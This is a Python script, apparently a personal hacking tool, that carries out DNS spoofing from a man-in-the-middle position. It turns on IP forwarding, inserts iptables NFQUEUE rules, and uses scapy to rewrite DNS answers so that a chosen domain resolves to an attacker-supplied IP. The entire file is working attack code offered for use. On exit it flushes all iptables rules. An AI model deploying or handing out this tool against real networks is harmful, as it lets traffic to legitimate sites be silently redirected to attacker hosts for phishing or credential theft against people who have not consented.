#!/usr/bin/env python

# Author: Matthew Zito (goldmund) 
# Contact: https://www.github.com/MatthewZito
# Version: 0.1.0

"""
Presumes controller is MITM.
Allocates incoming DNS reqests in a queue, validates matches
against a user-input URL and supplants each DNS response thereof
with a user-provided IP. The requested URL will always resolve
to the redirect IP. (see: DNS Spoofing) 
"""
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse

def elicit_arguments():
    """
    Fetches arguments...
    """
    parser = argparse.ArgumentParser(description="Conduct a DNS Spoof to redirect a given target url.")
    parser.add_argument("-t","--target", dest="target_url", help="the target url")
    parser.add_argument("-r","--redirect", dest="redirect_ip", help="the ip to which target will resolve")
    args = parser.parse_args() 
    if (not args.target_url):
        parser.error("[-] Target URL not specified. Use --help for usage instructions." )
    if (not args.redirect_ip):
        parser.error("[-] Redirect IP not specified. Use --help for usage instructions." )
    return args

def enable_port_fwd():
    """
    Enables port forwarding through controller machine.
    """
    print("[+] Enabling port forwarding.")
    ip_fwd_cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    # test_cmd = "echo 1 >> hello.txt"
    proc = subprocess.Popen(ip_fwd_cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),
    
def process_packet(packet): 
    """
    Determines how to process each packet in queue.
    Parses for those with DNS response, modifies response
    such that target_url resolves to the redirect_ip.
    """
    global target_url, redirect_ip
    # wrap payload packet in Scapy IP layer
    scapy_packet_obj = scapy.IP(packet.get_payload())
    if (scapy_packet_obj.haslayer(scapy.DNSRR)):
        q_name = scapy_packet_obj[scapy.DNSQR].qname
        if (target_url in q_name):
            print("[+] Resolving to provided IP...")
            manufactured_res = scapy.DNSRR(rrname=q_name,rdata=redirect_ip)
            scapy_packet_obj[scapy.DNS].an = manufactured_res # supplant DNS answer
            scapy_packet_obj[scapy.DNS].ancount = 1 # consolidate DNS answers to 1
            # CRITICAL: scapy will autogen correct len + checksum contingent on new data
            del scapy_packet_obj[scapy.IP].len
            del scapy_packet_obj[scapy.IP].chksum
            del scapy_packet_obj[scapy.UDP].len
            del scapy_packet_obj[scapy.UDP].chksum
            # distill into original packet obj 
            packet.set_payload(str(scapy_packet_obj))
    packet.accept()

def bind_queue():
    """
    Initiates a netfilterqueue object and binds to callback method
    so as to access the queue and act upon all packets therein.
    """
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

def instantiate_queue():
    """
    Enables queue by setting IP Tables rules to accomodate forwarding.
    """
    print("[+] Instantiating queue...")
    cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
    test_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
    enable_port_fwd()
    proc = subprocess.Popen(test_cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),
    bind_queue()

# global...horrible practice, I know - there's a reason,
# and it will nigh be fixed...
user_args = elicit_arguments()
target_url = user_args.target_url 
redirect_ip = user_args.redirect_ip 

def main():
    instantiate_queue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[x] Program terminated by user. Flushing IP Tables...")
        subprocess.call(["iptables --flush"], shell=True) # IMPT - clean up
        